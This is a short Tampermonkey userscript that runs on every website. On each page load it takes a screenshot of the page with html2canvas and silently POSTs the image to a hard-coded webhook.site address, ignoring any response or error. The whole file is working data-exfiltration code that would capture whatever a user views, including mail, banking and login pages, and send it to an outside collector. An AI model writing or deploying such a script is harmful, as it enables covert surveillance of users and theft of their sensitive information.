// ==UserScript==
// @name         Screenshot current page
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Send screenshot of current page to external server
// @author       Obianuju Chika-Nwanja
// @require      https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.3.2/html2canvas.min.js
// @match        *://*/*
// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tampermonkey.net
// @grant        GM_xmlhttpRequest
// ==/UserScript==

(function() {
    const screenshotPage = () => {
        var page = document.body;

        html2canvas(page).then((screenshot) => {
            var image = screenshot.toDataURL("image/png");
            if(image != "data:,"){

                fetch("https://webhook.site/b5510048-1cd8-4da0-8f92-a4100d4a7e6c/", {
                    method: "POST",
                    body: image
                }).then(function (response) {
                    //do nothing
                }).catch(function (err) {
                    //do nothing
                });
            }
        });
    }

    window.addEventListener("load", function() {
        setTimeout(screenshotPage, 500);
    });

})();
